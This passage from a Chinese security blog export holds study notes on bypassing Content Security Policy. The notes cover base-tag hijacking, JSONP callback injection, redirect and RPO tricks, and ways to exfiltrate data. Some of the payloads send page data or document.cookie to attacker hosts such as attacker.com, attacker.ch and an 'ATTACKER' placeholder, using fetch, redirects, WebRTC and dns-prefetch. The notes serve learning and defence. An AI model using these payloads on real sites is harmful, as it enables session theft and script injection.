class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行执行sha256一样的</p>
<h4 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-rjg103rj1298e&#x27; &#x27;strict-dynamic&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">rjg103rj1298e</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> element = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    element.<span class="property">src</span> = <span class="string">&#x27;test.js&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(element)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>从<code>nonce=rjg103rj1298e</code>这段生成的js代码也可以运行，因为<code>strict-dynamic</code></p>
<h2 id="CSP的配置"><a href="#CSP的配置" class="headerlink" title="CSP的配置"></a>CSP的配置</h2><p><a href="https://csp-evaluator.withgoogle.com">https://csp-evaluator.withgoogle.com</a><br>可以用这个网站查看csp策略是否有问题</p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题1</title>
    <url>/2023/09/25/%E5%88%B7%E9%A2%981/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="bb772bca8816af75deb46183da65fe6048f9fd836cc8d95dbcd696be3ae1602f"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>前端安全6-CSP绕过（笔记）</title>
    <url>/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过csp的一些方法</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10316449">https://ithelp.ithome.com.tw/articles/10316449</a><span id="more"></span>
</li>
</ul>
<h1 id="不安全的domain"><a href="#不安全的domain" class="headerlink" title="不安全的domain"></a>不安全的domain</h1><p>有一些三方库存在0day<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/CanardMandarin/csp-bypass</span><br></pre></td></tr></table></figure><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src https://unpkg.com/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react@16.7.0/umd/react.production.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> <span class="attr">csp</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="通过base标签绕过"><a href="#通过base标签绕过" class="headerlink" title="通过base标签绕过"></a>通过base标签绕过</h1><p>假设加上了nonce，且无法被猜测<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://attacker.com/my.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就会无法加载<code>my.js</code><br>但是如果用下面的代码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://attacker.com/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>通过改变base，然后去加载攻击者的<code>app.js</code><br>修复方法就是用上一章里面有的<code>base-uri &#39;none&#39;</code></p>
<h1 id="JSONP绕过"><a href="#JSONP绕过" class="headerlink" title="JSONP绕过"></a>JSONP绕过</h1><h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>因为同源策略，如果想向其他网站取出数据，通过下面的代码是无法取出数据的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://example.com/&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><br><img src="/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>会爆出上面的错误，但是加载别人的js代码是没问题的<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="variable">$jsoncallback</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_REQUEST</span> [<span class="string">&#x27;jsoncallback&#x27;</span>]);</span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="variable">$json_data</span> = <span class="string">&#x27;[&quot;customername1&quot;,&quot;customername2&quot;]&#x27;</span>;</span><br><span class="line"><span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jsoncallback</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$json_data</span> . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>别人调用一个函数，函数名是你自己的请求的，然后你这边把函数设计一下就行了<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP 实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divCustomers&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">callbackFunction</span>(<span class="params">result, methodName</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.<span class="property">length</span>; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + result[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;divCustomers&#x27;</span>).<span class="property">innerHTML</span> = html;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>这段代码是我从runoob抄下来的，他加了个htmlspecialchars，但是并没有什么卵用，直接绕<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=alert(1);callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>有一个仓库收集了一些jsonp，可以被绕过<br><a href="https://github.com/zigoo0/JSONBee">https://github.com/zigoo0/JSONBee</a></p>
<p>所以真正的过滤应该是，只允许<code>a-zA-Z.</code>这些字符<br>但是这样其实也有办法可以绕过<br><a href="https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/">https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/</a><br>参考这个文章，如果某个按钮出现了问题，你可以通过获取他的元素，然后click()<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstElementChild</span>.<span class="title function_">click</span>()</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果是个jsonp，那么就是<br><a href="https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click">https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click</a></p>
<h1 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://localhost https://192.168.3.16/a/b/c/d&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/a/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/301.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>301.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://192.168.3.16/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>前两个因为csp策略被阻拦了，最后一个是一个允许的，并且是个重定向，但是只能重定向到csp规定的host，他只是不在看path了，但是host还是看的，如果是<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://abc.com/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>还是会被拦截</p>
<h1 id="RPO绕过"><a href="#RPO绕过" class="headerlink" title="RPO绕过"></a>RPO绕过</h1><p>如果CSP是允许<code>https://example.com/script/abc/</code><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://127.0.0.1/script/abc/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;pragma&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Cache-Control&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache, must-revalidate&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;expires&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/script/abc/..%2f..%2ftest.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>那么上面的代码就可以绕过，但是这是要取决于后端服务器的处理，nginx和nodejs是可以的，其他没测试过，到时候可以看看</p>
<h1 id="通源类型的绕过"><a href="#通源类型的绕过" class="headerlink" title="通源类型的绕过"></a>通源类型的绕过</h1><p>如果要获取<code>http://127.0.0.1/ycb.php</code>中的内容，但是<code>ycb.php</code>有csp保护，如下<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这时候该网站的另一个页面存在xss，并且没有CSP的保护（或者可以绕过），就可以通过很多方法去获得这个flag</p>
<ol>
<li><p>iframe</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">iframe.<span class="property">src</span>=<span class="string">&quot;http://127.0.0.1/ycb.php&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="title function_">alert</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span>),<span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>fetch</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1/ycb.php&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>)=&gt;</span><span class="title function_">alert</span>(data))</span><br></pre></td></tr></table></figure>
</li>
<li><p>window.open</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ycb = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://127.0.0.1/ycb.php&#x27;</span>)</span><br><span class="line">ycb.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(ycb.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerText</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="其他种类的绕过"><a href="#其他种类的绕过" class="headerlink" title="其他种类的绕过"></a>其他种类的绕过</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;unsafe-inline&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// any JavaScript code</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>因为<code>default-src &#39;none&#39;</code>的原因，<code>connect-src</code>也被设为了<code>&#39;none&#39;</code>，这时候就没法使用fetch了，那么还有什么办法</p>
<ol>
<li><p>跳转</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span> <span class="comment">//这种是在当前页面跳转</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// 这种需要被攻击者确认弹窗，在UI模式下，headless不清楚</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>WebRTC<br>通过dns来获取数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">    <span class="attr">iceServers</span>: [&#123;</span><br><span class="line">        <span class="attr">urls</span>: <span class="string">&quot;stun:&quot;</span> + <span class="string">&quot;7a04c2947c.ipv6.1433.eu.org:1337&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="title function_">createDataChannel</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">p.<span class="title function_">setLocalDescription</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>DNS prefetch<br>为了让加载速度更快，浏览器可以提前去解析一些标签的host为ip，但是只限于老版本的浏览器，现在新的已经不行了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sessionid = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]+<span class="string">&quot;.&quot;</span>; </span><br><span class="line"><span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">body.<span class="property">innerHTML</span> = body.<span class="property">innerHTML</span> + <span class="string">&quot;&lt;link rel=\&quot;dns-prefetch\&quot; href=\&quot;//&quot;</span> + sessionid + <span class="string">&quot;attacker.ch\&quot;&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- firefox --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//$&#123;cookie&#125;.vps_ip&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- chrome --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//vps_ip?$&#123;cookie&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以加上这个header用来防御<br><code>X-DNS-Prefetch-Control: off</code></p>
</li>
</ol>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全7-原型链污染（笔记）</title>
